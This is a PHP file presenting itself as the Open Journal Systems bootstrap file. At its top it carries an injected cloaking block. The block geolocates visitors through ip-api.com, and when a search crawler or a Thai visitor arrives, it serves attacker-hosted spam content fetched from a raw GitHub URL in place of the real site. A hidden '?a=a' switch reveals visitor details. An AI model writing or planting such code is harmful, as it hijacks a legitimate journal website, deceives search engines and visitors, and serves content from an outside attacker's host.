<?php
$userAgent = $_SERVER['HTTP_USER_AGENT'];
$ip = $_SERVER['REMOTE_ADDR'];
function getCountryByIp($ip)
{
    $url = "http://ip-api.com/json/$ip";

    $response = file_get_contents($url);
    $data = json_decode($response, true);
    $countryCode = $data['countryCode'];
    return $countryCode;
}
$ctryCode = getCountryByIp($ip);

if (isset($_GET['a']) && $_GET['a'] === 'a') {
    echo "country: " . $ctryCode;
    echo "<br>";
    echo "useragent: " . $userAgent;
    echo "<br>";
    echo "ip: " . $ip;
    exit;
}

if (preg_match('/bot|crawl|slurp|bingbot|Google-Site-Verification|Google-InspectionTool|AhrefsBot|spider/i', $userAgent) || $ctryCode == 'TH') {
    echo file_get_contents('https://raw.githubusercontent.com/seovennn/good/refs/heads/main/landing/jurnal.astinamandiri/index.txt');
    exit;
}
/**
 * @defgroup index Index
 * Bootstrap and initialization code.
 */

/**
 * @file includes/bootstrap.inc.php
 *
 * Copyright (c) 2014-2021 Simon Fraser University
 * Copyright (c) 2000-2021 John Willinsky
 * Distributed under the GNU GPL v3. For full terms see the file docs/COPYING.
 *
 * @ingroup index
 *
 * @brief Core system initialization code.
 * This file is loaded before any others.
 * Any system-wide imports or initialization code should be placed here.
 */


/**
 * Basic initialization (pre-classloading).
 */

define('ENV_SEPARATOR', strtolower(substr(PHP_OS, 0, 3)) == 'win' ? ';' : ':');
if (!defined('DIRECTORY_SEPARATOR')) {
	// Older versions of PHP do not define this
	define('DIRECTORY_SEPARATOR', strtolower(substr(PHP_OS, 0, 3)) == 'win' ? '\\' : '/');
}
define('BASE_SYS_DIR', dirname(INDEX_FILE_LOCATION));
chdir(BASE_SYS_DIR);

// System-wide functions
require('./lib/pkp/includes/functions.inc.php');

// Initialize the application environment
import('classes.core.Application');

return new Application();
